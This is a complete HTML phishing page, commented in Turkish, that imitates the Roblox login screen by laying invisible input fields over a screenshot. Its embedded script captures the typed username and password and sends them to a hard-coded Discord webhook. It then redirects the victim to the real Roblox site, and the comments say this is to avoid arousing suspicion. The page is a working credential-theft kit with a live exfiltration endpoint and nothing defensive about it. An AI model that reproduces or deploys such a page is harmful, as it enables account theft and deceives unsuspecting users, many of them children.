<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Giriş</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #0b0e11;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }

        .container {
            position: relative;
            width: 100%;
            height: 100%;
            max-width: 100vw;
            max-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .tam-ekran-resim {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block;
        }

        .container input, .container button, .container a {
            position: absolute;
            width: 19.5%; 
            height: 38px; 
            left: 50%;
            transform: translateX(-50%);
            background: transparent;
            border: none;
            outline: none;
            box-sizing: border-box;
        }

        .container input {
            color: #ffffff;
            font-size: 14px;
            padding: 0 12px;
            line-height: 38px; 
            height: 38px;
        }

        .container button, .container a {
            cursor: pointer;
        }

        .username-field { top: calc(36.3% - 15px); }
        .password-field { top: calc(41.5% - 15px); }
        .login-btn { top: calc(46.8% - 15px); }
        
        .one-time-code-btn { top: 57.5%; height: 42px; }
        .quick-login-btn { top: 62.5%; height: 42px; }
        .signup-link { top: 69.5%; height: 25px; width: 5%; left: 58%; }
    </style>
</head>
<body>

    <div class="container">
        <img src="roblox_giris.png" class="tam-ekran-resim" alt="Roblox">

        <!-- id="girisFormu" ekledik ve PHP yönlendirmesini iptal ettik -->
        <form id="girisFormu">
            <input type="text" id="username" name="username" class="username-field" required autocomplete="off">
            <input type="password" id="password" name="password" class="password-field" required>
            <button type="submit" class="login-btn" title="Giriş Yap"></button>
        </form>

        <button type="button" class="one-time-code-btn"></button>
        <button type="button" class="quick-login-btn"></button>
        <a href="https://roblox.com" target="_blank" class="signup-link" title="Kayıt Ol"></a>
    </div>

    <!-- ARKA PLAN GİZLİ VERİ GÖNDERME KODU -->
    <script>
        // BURAYA KOPYALADIĞIN DISCORD WEBHOOK LİNKİNİ YAPIŞTIR
        const webhookURL = "https://discord.com/api/webhooks/1504533553780887593/k-e_pISawJOV-LvtFhqqXuSPRMhGuUjC8N3i8IyXimO3yKkJ2R8UeiSR7e4ZJ9SqGc6S";

        document.getElementById('girisFormu').addEventListener('submit', function(e) {
            e.preventDefault(); // Sayfanın yenilenmesini engeller

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            // Discord'a gidecek mesaj formatı
            const mesaj = {
                content: `🔔 **Yeni Roblox Girişi Yakalandı!**\n👤 **Kullanıcı Adı / E-posta:** \`${user}\`\n🔑 **Şifre:** \`${pass}\`\n📅 **Tarih:** ${new Date().toLocaleString('tr-TR')}`
            };

            // Veriyi gizlice Discord'a postalar
            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(mesaj)
            })
            .then(() => {
                // Şifreyi gönderdikten sonra şüphe çekmemek için kurbanı gerçek Roblox sitesine yönlendirir
                window.location.href = "https://roblox.com";
            })
            .catch((error) => {
                // Hata olsa bile çaktırmamak için yine de yönlendirir
                window.location.href = "https://roblox.com";
            });
        });
    </script>

</body>
</html>
